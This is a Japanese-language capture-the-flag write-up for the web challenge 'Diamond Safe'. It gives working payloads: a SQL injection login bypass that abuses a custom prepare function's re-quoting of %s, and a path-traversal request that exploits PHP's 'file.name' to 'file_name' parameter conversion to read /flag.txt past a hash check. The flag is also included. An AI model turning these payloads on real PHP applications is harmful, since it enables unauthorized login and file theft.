# 問題
- [web] Diamond Safe
# [web] Diamond Safe

問題はログインの部分とフラグをとる部分に分かれる。

構成は以下の通り  
php-fpm に flag.txt がある。  

```yml
version: '3.7'

services:
  web:
      image: nginx:latest
      restart: unless-stopped
      env_file: .env
      ports:
          - "4444:80"
      volumes:
          - ./src:/var/www/html
          - ./templates:/etc/nginx/templates
      depends_on: 
        - db
        - php-fpm
      networks:
        - phpnet


  php-fpm:
      build: ./fpm
      restart: unless-stopped
      env_file: .env
      volumes:
          - ./src:/var/www/html
          - ./files:/var/www/files
          - ./flag.txt:/flag.txt:ro
      depends_on: 
        - db
      networks:
        - phpnet


  db:
    image: mysql:5.7
    env_file: .env
    restart: unless-stopped
    networks:
        - phpnet

networks:
  phpnet:
    name: phpnet
```

## ログイン

php-fpm のコードを見ると、ログインの部分は以下のようになっている。  
sql の部分が自前で実装されている。  
`db.prepare` は 第一引数の`%s` の数が第二引数の長さが等しい時、`%s` をクォートで囲んで、引数で置換されるようになっていた。  
> その他の処理も入っている。
```php

$query = db::prepare("SELECT * FROM `users` where password=sha1(%s)", $_POST['password']);

if (isset($_POST['name'])) {
    $query = db::prepare($query . " and name=%s", $_POST['name']);
} else {
    $query = $query . " and name='default'";
}
$query = $query . " limit 1";
echo $query;

$result = db::commit($query);


```

一回目の`$_POST['password']`が`%s`を含んでいると、その次に`db.prepare` を呼ぶと再度クォートが追加されるので任意のsql文を実行することができる。  
最終的なペイロードは以下のようになる。

`password=%s&name[]=) or 1=1; #&name[]=aa` 


## フラグ

`download.php`を見ると以下のような部分があるので、任意のファイルを読み取ることができる
```php
$file = '/var/www/files/' . $_GET['file_name'];
if (!file_exists($file)) {
    echo "file not exist";
    redirect('vault.php');
    die();
} else {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}

```

この部分が読みだされる前に`check_url` が呼び出されている。  
hash には環境変数が含まれており、それを特定するのは困難なので、それ以外の方法を考える。  

`files` 以下にあるファイルに対するハッシュ値はわかっているので、そのハッシュを使って条件を回避する。  
ここでファイルを読みだす部分は `$_GET['file_name']` の値が使われ、ハッシュ値の確認には`$params['file_name']`が使われている。  
この差分を利用する。  処理は以下の php を参照

```php
function check_url()
{
    // fixed bypasses with arrays in get parameters
    $query  = explode('&', $_SERVER['QUERY_STRING']);
    $params = array();
    foreach ($query as $param) {
        // prevent notice on explode() if $param has no '='
        if (strpos($param, '=') === false) {
            $param += '=';
        }
        list($name, $value) = explode('=', $param, 2);
        $params[urldecode($name)] = urldecode($value);
    }

    if (!isset($params['file_name']) or !isset($params['h'])) {
        return False;
    }

    $secret = getenv('SECURE_URL_SECRET');
    $hash = md5("{$secret}|{$params['file_name']}|{$secret}");

    if ($hash === $params['h']) {
        return True;
    }
    return False;
}
```

php の仕様で `file.name` みたいなクエリパラメータを `$_GET['file_name']`でとれる。  
さらにphp は重複するクエリパラメータの最後のものを採用する。  
>ドキュメントの下のほうに書いてあった気がするがどこか忘れたので見つけ次第追記する。

よって以下のようなリクエストをするとフラグが得られる。


`download.php?h=95f0dc5903ee9796c3503d2be76ad159&file_name=Diamond.txt&file.name=../../../flag.txt`

`flag{lul_php_challenge_1n_2021_lul}`